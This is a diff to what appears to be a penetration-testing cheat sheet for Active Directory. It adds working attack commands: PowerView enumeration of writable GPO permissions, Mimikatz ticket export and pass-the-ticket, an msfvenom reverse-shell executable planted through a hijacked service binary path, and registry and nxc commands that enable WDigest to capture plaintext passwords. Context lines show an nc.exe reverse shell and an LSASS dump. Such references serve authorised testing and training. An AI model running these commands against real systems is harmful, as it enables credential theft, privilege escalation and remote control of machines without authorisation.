@@ -165,6 +165,8 @@ powershell -ep bypass
 > get-domaingroup | Get-DomainGroupMember -Recurse
 > Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
 > Get-DomainObjectAcl "dc=nagoya-industries,dc=com" -ResolveGUIDs -Cred $Cred | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
+# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
+> Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
 ```
 
 ### PowerShell Scripts
@@ -1222,8 +1224,10 @@ token::elevate /domainadmin
 privilege::debug # Test if ^ is the case
 log
 sekurlsa::logonpasswords # Who has been on the host machine?
-kerberos::list
+kerberos::list /export
+kerberos::ptt ticket.kirbi # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
 lsadump::lsa /inject
+kerberos::tgt
 sekurlsa::msv
 sekurlsa::ekeys
 lsadump::sam
@@ -1899,6 +1903,14 @@ sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.16
 nc -lvnp 1234
 ```
 
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=$myip LPORT=$port EXITFUNC=thread -f exe > shell.exe
+
+sc.exe config VMTools binPath="C:\Users\aarti\Documents\shell.exe"
+sc.exe stop VMTools
+sc.exe start VMTools
+```
+
 #### ForceChangePassword
 
 
@@ -2034,4 +2046,16 @@ put test.lnk
 
 ```bash
 pypykatz lsa minidump lsass.DMP
+```
+
+#### Enable WDigest on Newer Machines
+
+While WDigest is disabled on newer machines, it is possible for attackers to enable it so plaintext credentials once a user logs in. WDigest can be enabled by setting the necessary registry key to “1” instead of “0”: 
+
+```bash
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
+```
+
+```bash
+nxc smb 192.168.0.76 -u testadmin -p Password123 -M wdigest -o action=enable
 ```
